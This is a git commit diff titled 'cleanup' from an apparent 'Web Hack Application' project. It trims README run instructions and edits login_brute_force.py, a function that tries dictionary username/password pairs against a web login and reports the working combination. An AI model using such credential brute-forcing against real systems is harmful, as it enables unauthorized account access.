a2517bd7deb2de1fb91ed278f2c9ecc4d1389890
Monther Balghonaim <mab_only@windowslive.com>
2020-11-28 18:06:56 -0800

    cleanup

--- README.md
+++ README.md
@@ -4,10 +4,3 @@ Web Hack Application
 
 Run `pip install -r requirements.txt`
 
-
-## Run
-
-1. Create list of targets (generates targets.txt):
-
-`python create_targets.py -p 80`
-
--- login_brute_force.py
+++ login_brute_force.py
@@ -1,11 +1,12 @@
 import requests
-success_log = "success.log"
 
 """
 Takes in a url and username/password formats, then attempts to log in using a dictionary of usernames and passwords.
 
 Returns a string containing the successful username and password combination
 """
+
+
 def brute_force_login(url, username_format, password_format):
     passlist = open('passwords.txt').read().splitlines()
     userlist = open('usernames.txt').read().splitlines()
@@ -16,6 +17,3 @@ def brute_force_login(url, username_format, password_format):
                 return f"Successful login with username: '{username}', password: '{password}', host: '{url}\'n'"
             else:
                 print(f"Failed login with username: '{username}', password: '{password}', host: '{url}'")
-
-
-print(brute_force_login('http://127.0.0.1:3000/auth', 'username', 'password'))
